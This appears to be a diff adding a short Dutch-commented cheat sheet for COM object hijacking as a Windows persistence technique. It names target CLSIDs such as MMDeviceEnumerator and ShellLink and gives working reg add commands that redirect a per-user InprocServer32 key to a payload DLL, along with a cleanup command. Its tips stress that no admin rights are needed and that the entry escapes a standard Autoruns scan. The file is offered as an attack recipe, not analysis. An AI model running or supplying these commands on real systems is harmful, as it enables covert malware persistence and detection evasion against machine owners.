@@ -1,0 +1,16 @@
+# COM Object Hijacking - Persistentie zonder admin rechten
+# Overschrijf een veelgebruikte COM CLSID in HKCU (per-user)
+# Stap 1: Zoek een hijackable COM object
+# Gebruik Process Monitor: filter op RegOpenKey, Result=NAME NOT FOUND, Path contains InprocServer32
+# Bekende targets:
+# {BCDE0395-E52F-467C-8E3D-C4579291692E} - MMDeviceEnumerator (wordt geladen door veel apps)
+# {00021401-0000-0000-C000-000000000046} - ShellLink (bij .lnk openen)
+# Stap 2: Registry key aanmaken (HKCU overschrijft HKLM)
+reg add "HKCU\Software\Classes\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\tasks\payload.dll" /f
+reg add "HKCU\Software\Classes\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Both" /f
+# Opruimen:
+reg delete "HKCU\Software\Classes\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}" /f
+# Tip: Geen admin rechten nodig (HKCU)
+# Tip: Vereist een DLL payload (niet EXE)
+# Tip: Wordt getriggerd wanneer een applicatie het COM object laadt
+# Tip: Moeilijk te detecteren - verschijnt niet in standaard Autoruns scan
